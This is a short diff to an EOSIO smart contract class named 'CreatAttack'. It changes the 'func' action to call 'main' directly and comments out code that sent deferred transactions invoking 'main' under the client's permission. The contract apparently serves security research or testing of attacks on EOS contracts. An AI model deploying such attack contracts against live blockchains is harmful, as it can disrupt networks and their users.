@@ -50,18 +50,20 @@ class [[eosio::contract]] CreatAttack : public eosio::contract {
         [[eosio::action]]
         void func(name client, name target ,uint64_t idx)
         {
-            auto argu = std::make_tuple(client, target , uint64_t(idx));
+			main(client, target, idx);
 			/*
+            auto argu = std::make_tuple(client, target , uint64_t(idx));
+
 			int N = 1;
 			transaction out{};
 			out.actions.emplace_back(permission_level{currentContract, "active"_n},\
 					currentContract , "main"_n, std::make_tuple(currentContract, uint64_t(idx + N)));
 			out.delay_sec = 0;
 			out.send((idx+N), currentContract, false);
-			*/
             transaction out{};
             out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, argu );
             out.send((idx), client, false);
+			*/
             print("\t[#] FUNC: ", idx);
         };
 };
